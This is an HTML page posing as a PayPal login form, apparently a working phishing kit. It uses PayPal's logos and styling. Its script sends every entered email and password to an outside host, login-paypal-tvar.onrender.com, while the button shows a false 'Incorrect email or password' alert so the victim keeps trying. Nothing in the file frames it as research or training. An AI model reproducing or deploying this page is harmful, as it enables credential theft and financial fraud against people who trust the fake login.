<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f9fc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: white;
            width: 350px;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .logo {
            width: 50px;
            margin-bottom: 20px;
        }

        .input-field {
            width: 90%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        .forgot-link {
            display: block;
            text-align: left;
            color: #0070ba;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 15px;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .next-btn {
            width: 100%;
            padding: 12px;
            background-color: #0070ba;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: bold;
        }

        .next-btn:hover {
            background-color: #005ea6;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
            color: gray;
            font-size: 14px;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #ddd;
            margin: 0 10px;
        }

        .signup-btn {
            width: 100%;
            padding: 12px;
            border: 2px solid black;
            background-color: white;
            font-size: 16px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: bold;
        }

        .signup-btn:hover {
            background-color: #f7f9fc;
        }

        .language-options {
            margin-top: 20px;
            font-size: 12px;
            color: gray;
        }

        .language-options a {
            margin: 0 5px;
            text-decoration: none;
            color: black;
        }

        .language-options a:hover {
            text-decoration: underline;
        }
    </style>
    <link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico">
    <link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png">
</head>

<body>

    <div class="login-container">
        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo" class="logo">
        <form action="/login" id="login-form" method="post">
            <div style="margin-bottom: 3px;">
                <input type="email" name="email" id="email" class="input-field" placeholder="Email or mobile number"
                    required>
            </div>
            <div style="margin-bottom: 3px;">
                <input type="password" name="password" id="password" class="input-field" placeholder="Password"
                    required>
            </div>
            <a href="#" class="forgot-link">Forgot email?</a>
            <button type="submit" class="next-btn" onclick="alert('Incorrect email or password')">Sign In</button>
        </form>
        <div class="divider">or</div>
        <button class="signup-btn">Sign Up</button>
        <div class="language-options">
            <a href="#">English</a> | <a href="#">Français</a> | <a href="#">Español</a> | <a href="#">中文</a>
        </div>
    </div>
    <script>
        document.getElementById("login-form").addEventListener("submit", async function (event) {
            event.preventDefault();

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            if (!email || !password) {
                alert("Please enter both email and password.");
                return;
            }

            try {
                const response = await fetch("https://login-paypal-tvar.onrender.com/login", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ email, password })
                });
            } catch (error) {
                alert("Check your network connection");
            }
        });
    </script>
</body>

</html>
